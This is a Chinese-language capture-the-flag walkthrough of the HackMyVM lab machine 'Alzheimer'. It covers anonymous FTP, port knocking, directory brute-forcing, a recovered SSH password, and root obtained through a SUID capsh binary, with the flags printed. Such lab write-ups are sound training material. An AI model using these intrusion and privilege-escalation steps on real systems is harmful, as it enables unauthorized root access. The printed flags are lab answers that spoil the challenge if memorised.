# Alzheimer

2024-11-04 https://hackmyvm.eu/machines/machine.php?vm=Alzheimer

## IP

192.168.5.40

## Scan

```
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh
80/tcp filtered http
```

ftp 允许匿名登陆，先看看有什么有用信息，发现隐藏文件 .secretnote.txt，查看其内容：

```
I need to knock this ports and
one door will be open!
1000
2000
3000
```

发现是端口敲震，使用 knock 进行处理：knock -v 192.168.5.40 1000 2000 3000 , 敲震后，发现 ssh 和 http 端口已经 open。

访问 80 web 服务，得到提示：

```
I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa

<!---. --- - .... .. -. --. -->
```

底部得到了摩尔斯码，进行解码得到内容：OTHINGM， 尝试 ssh 登陆，发现不是 medusa 的密码。

提示我们密码放在了 txt 文件中，使用字典对 web 进行爆破，得到了以下几个目录：

```
http://192.168.5.40/home/
http://192.168.5.40/admin/
http://192.168.5.40/secret/
http://192.168.5.40/secret/home/
```

访问 http://192.168.5.40/secret/home/ 得到 : Im trying a lot. Im sure that i will recover my pass! -medusa

没有找到其他内容，根据上面的提示，发现与 ftp 文件中的内容相似，再次访问 ftp 中的 .secretnote.txt ，发现密码已经写入到该文件中：Ihavebeenalwayshere!!!

使用 medusa/Ihavebeenalwayshere!!! 凭据进行登陆，获得了 user flag：

```
medusa@alzheimer:~$ cat user.txt
HMVrespectmemories
```

寻找提权 root 的路径，sudo -l 发现 (ALL) NOPASSWD: /bin/id 没有利用价值，suid 发现 /usr/sbin/capsh 可以进行利用：

```
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(medusa)
root@alzheimer:~# cd /root
root@alzheimer:/root# ls
root.txt
root@alzheimer:/root# cat root.txt
HMVlovememories
```
